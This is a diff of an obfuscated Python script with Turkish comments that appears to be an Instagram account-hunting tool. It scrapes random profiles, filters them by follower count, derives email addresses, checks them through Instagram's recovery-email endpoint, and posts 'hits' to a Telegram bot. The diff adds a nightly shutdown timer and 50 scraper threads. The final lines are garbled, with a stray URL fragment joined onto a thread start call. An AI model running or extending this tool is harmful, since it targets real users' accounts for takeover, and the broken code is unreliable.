@@ -1,3 +1,4 @@
+
 s = input
 X = int
 W = open
@@ -19,6 +20,41 @@ from rich.panel import Panel
 import webbrowser as y
 
 init(autoreset=True)
+
+# Zaman kontrolü fonksiyonu
+def check_shutdown_time():
+    """Saat 22:00'da programı kapat"""
+    try:
+        # API'den şu anki zamanı al
+        response = A.get("https://tools.aimylogic.com/api/now?tz=Europe/Istanbul&format=dd/MM/yyyy")
+        current_time = response.json()
+        
+        current_hour = current_time.get("hour", 0)
+        current_minute = current_time.get("minute", 0)
+        
+        # 22:00 kontrolü
+        if current_hour >= 22:
+            V(f"\n{B}[!] Saat {current_hour:02d}:{current_minute:02d} - Program kapatılıyor...")
+            os._exit(0)
+            
+    except Exception as e:
+        # API çalışmazsa sistem saatini kullan
+        current_hour = datetime.now().hour
+        current_minute = datetime.now().minute
+        
+        if current_hour >= 22:
+            V(f"\n{B}[!] Saat {current_hour:02d}:{current_minute:02d} - Program kapatılıyor...")
+            os._exit(0)
+
+# Zaman kontrol thread'i
+def time_checker():
+    """Sürekli zaman kontrolü yapan thread"""
+    while True:
+        check_shutdown_time()
+        time.sleep(60)  # Her 60 saniyede bir kontrol et
+
+# Zaman kontrol thread'ini başlat
+u(target=time_checker, daemon=True).start()
 
 # ⚠️ BOŞLUKSUZ URL'LER (DÜZELTİLDİ)
 c = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"  # <-- boşluk yok
@@ -82,7 +118,7 @@ U = 0  # Good IG
 o = {}
 
 # Başlık
-A5 = w("{PUNİSHER}", colors=["white", "blue"], align="center")
+A5 = w("{31}", colors=["white", "blue"], align="center")
 V(
     f"""
 [1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -100,6 +136,9 @@ V("\x1b[1;34m━━━━━━━━━━━━━━━━━━━━━━�
 AA = X(s("\x1b[1;33m - Minimum Takipçi : "))  # <<<--- EKLENDİ
 os.system("clear")
 
+# Başlangıç zamanı kontrolü
+check_shutdown_time()
+
 # Telegram video gönder
 try:
     A.post(
@@ -108,9 +147,17 @@ try:
 except F:
     pass
 
-# Durum çubuğu (HIT / BAD vs.)
+# Durum çubuğu (HIT / BAD vs.) - Zaman bilgisi eklendi
 def J():
-    A_str = f"\r{A3}Hits{A4} : {R}{I} |{B} Bad IG{H} : {I}{S}{H} | {B}Bad Email{n} : {I}{T}{B} | {H}Good IG{B} : {I}{U}"
+    try:
+        # Şu anki zamanı al
+        response = A.get("https://tools.aimylogic.com/api/now?tz=Europe/Istanbul&format=dd/MM/yyyy")
+        current_time = response.json()
+        time_display = f"{current_time['hour']:02d}:{current_time['minute']:02d}"
+    except:
+        time_display = f"{datetime.now().hour:02d}:{datetime.now().minute:02d}"
+    
+    A_str = f"\r{A3}Hits{A4} : {R}{I} |{B} Bad IG{H} : {I}{S}{H} | {B}Bad Email{n} : {I}{T}{B} | {H}Good IG{B} : {I}{U} | {z}Time: {time_display}"
     sys.stdout.write(A_str)
     sys.stdout.flush()
 
@@ -297,6 +344,40 @@ def A9(username, domain):
         M_file.write(H_msg + "\n")
     try:
         A.get(f"https://api.telegram.org/bot{q}/sendMessage?chat_id={p}&text={H_msg}")
+    except F:
+        pass
+
+# Instagram scraper (minimum takipçi ile)
+def AB():
+    while True:
+        # Her döngüde zaman kontrolü
+        check_shutdown_time()
+        
+        D_data = {
+            "lsd": "".join(a.choices(Z.ascii_letters + Z.digits, k=32)),
+            "variables": Y.dumps({
+                "id": X(a.randrange(1279000, 21254029834)),
+                "render_surface": "PROFILE",
+            }),
+            "doc_id": "25618261841150840",
+        }
+        E_headers = {"X-FB-LSD": D_data["lsd"]}
+        try:
+            F_resp = A.post("https://www.instagram.com/api/graphql", headers=E_headers, data=D_data)
+            B_user = F_resp.json().get("data", {}).get("user", {})
+            C_username = B_user.get("username")
+            G_followers = B_user.get("follower_count", 0)
+            if C_username and G_followers >= AA:  # <<<--- Minimum takipçi kontrolü
+                o[C_username] = B_user
+                H_emails = [C_username + P]
+                for I_email in H_emails:
+                    A7(I_email)
+        except:
+            pass
+
+# Thread başlat
+for _ in K(50):
+    u(target=AB).start().org/bot{q}/sendMessage?chat_id={p}&text={H_msg}")
     except F:
         pass
 
